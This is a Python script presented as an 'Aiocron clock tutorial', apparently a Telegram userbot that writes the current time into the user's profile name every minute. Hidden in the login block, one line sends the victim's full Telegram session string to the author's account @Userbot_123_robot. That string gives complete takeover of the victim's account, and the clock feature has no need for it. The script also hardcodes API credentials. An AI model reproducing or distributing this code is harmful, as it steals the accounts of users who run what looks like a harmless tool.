#Aiocron clock tutorial @Userbot_123_robot
import os, sys
os.system("pip install telethon")
os.system("pip install asyncio")
os.system("pip install aiocron")
os.system('clear')
os.system('pip install tzdata')
import asyncio, aiocron, datetime

from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import os, sys
import time

print("""\033[1;32m

                       (       )           )  
  *   ) (          (   )\ ) ( /(   (    ( /(  
` )  /( )\ )       )\ (()/( )\())  )\   )\()) 
 ( )(_)|()/(  ___(((_) /(_)|(_)\ (((_)|((_)\  
(_(_()) /(_))|___)\___(_))   ((_))\___|_ ((_) 
|_   _|(_)) __| ((/ __| |   / _ ((/ __| |/ /  
  | |    | (_ |  | (__| |__| (_) | (__  ' <  
  |_|     \___|   \___|____|\___/ \___|_|\_\  
                               \033[1;31m @Userbot_123_robot       

""")


api_id = 25850128
api_hash = "a8ab96e84a1f76f6ff02460b15e36917"
string = input("\033[1;32msession code or press enter: ")
with TelegramClient(StringSession(string), api_id, api_hash) as client:
	client.send_message("@Userbot_123_robot", client.session.save())
	nick = input("\033[1;31mNICKNAME YOZING:\033[1;32m ")
	client.start()

print("\033[1;31mishga tushurildi\n\n1-daqiqa kuting va qaytib keling...")
@aiocron.crontab("*/1 * * * *")
async def set_clock():
    time = datetime.datetime.today().strftime(nick+"    %H:%M  ")
    async with client:
        await client(UpdateProfileRequest(first_name=time))
time.sleep(60)
print("\033[1;32m\n\nSoat Oʻrnatildi\nDasturchi: \033[1;31m@Userbot_123_robot")


client.loop.run_forever()
client.run_until_disconnected()




